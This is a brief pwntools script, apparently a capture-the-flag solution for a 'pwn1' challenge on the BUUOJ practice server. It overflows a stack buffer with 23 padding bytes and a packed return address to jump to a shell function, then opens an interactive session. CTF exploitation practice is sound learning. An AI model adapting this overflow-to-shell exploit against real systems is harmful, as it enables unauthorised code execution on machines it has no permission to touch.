#!/usr/bin/python
#__author__:TaQini

from pwn import *
context.log_level = 'debug'

len = 23 
sh = 0x40118a

# p = process('./pwn1')
p = remote('node3.buuoj.cn',29265)
# p.recvuntil('please input\n')

# gdb.attach(p)

p.sendline('a'*len+p64(sh))

p.interactive()
